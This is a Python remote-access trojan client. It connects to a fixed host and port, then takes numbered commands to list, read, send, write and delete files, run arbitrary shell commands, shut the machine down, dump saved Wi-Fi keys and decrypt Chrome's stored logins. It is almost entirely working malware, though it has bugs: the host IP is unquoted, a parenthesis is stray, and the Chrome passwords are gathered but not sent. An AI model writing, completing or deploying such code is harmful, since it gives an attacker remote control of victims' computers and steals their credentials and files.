import os
import shutil
import socket
from multiprocessing.dummy import Pool as ThreadPool
from urllib.request import urlopen

s = socket.socket()
host = 192.168.1.11
port = 8080
s.connect((host, port))

print("connected* ")

while 1:
    command = s.recv(1040)
    command = command.decode()
    print("command recived")
    if command == "1":
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())

    elif command == "2":
        userInput = s.recv(5000)
        userInput = userInput.decode()
        files = os.listdir(userInput)
        files = str(files)
        s.send(files.encode())

    elif command == "3":
        filePath = s.recv(50000)
        filePath.decode()
        file = open(filePath, "rb")
        data = file.read()
        s.send(data)

    elif command == "4":
        # delete file
        path = s.recv(50000).decode()
        if os.path.exists("file.txt"):
            os.remove(path)
            s.send("Done".encode())
        else:
            s.send("Failed".encode())

    elif command == "5":
        # delete Dir
        path = s.recv(50000).decode()
        shutil.rmtree(path)
        s.send("Done".encode())

    elif command == "6":
        # make File
        path = s.recv(50000).decode()
        f = open(path, "w")

        contant = s.recv(500000).decode()
        f.write(str(contant))

        s.send("Done".encode())

    elif command == "7":
        # Send ipconfig
        string = os.system("ipconfig")
        s.send("Results of ipconfig******".encode())

    elif command == "8":
        # Exec custom command
        tar = s.recv(50000).decode() 
        try:
            os.system(str(tar))
            s.send("Done".encode())
        except:
            s.send("bad command".encode())

    elif command == "9":
        # Shutdown PC
        import sys

        if sys.platform == 'win32':
            import ctypes

            user32 = ctypes.WinDLL('user32')
            user32.ExitWindowsEx(0x00000008, 0x00000000)

        else:
            os.system('sudo shutdown now')
        # os.system('shutdown /p /f')# alt shutdown /s

    elif command == "10":
        # Get get wifi password list
        import subprocess

        string = ""
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        for i in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode(
                'utf-8').split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            try:
                print("{:<30}|  {:<}".format(i, results[0]))
            except IndexError:
                print("{:<30}|  {:<}".format(i, ""))
            string += results.pop()
            string += "\n"

        s.send(str(string).encode())


    elif command == "11":
        # Get Chrome passwords list
        from shutil import copyfile
        from sqlite3 import connect
        import win32crypt

        env = os.getenv("LOCALAPPDATA")
        chrome_passwords = "Chrome passwords:\n"

        path = env + "\\Google\\Chrome\\User Data\\Default\\Login Data"
        path2 = env + "\\Google\\Chrome\\User Data\\Default\\Login2"
        path = path.strip()
        path2 = path2.strip()

        try:
            copyfile(path, path2)
        except:
            pass
        conn = connect(path2)
        cursor = conn.cursor()
        cursor.execute(
            'SELECT action_url, username_value, password_value FROM logins')

        sites = []
        for raw in cursor.fetchall():
            # print(raw)
            ## raw[0] = url
            ## raw[1] = login
            ## raw[2] = binary
            try:
                if raw[0] not in sites:
                    # print(format(win32crypt.CryptUnprotectData(raw[2])[1]))

                    chrome_passwords += '\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[
                        1] + '\n' + "Password: " + format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')

                    sites.append(raw[0])
            except:
                continue
        conn.close()
        s.send("Done".encode())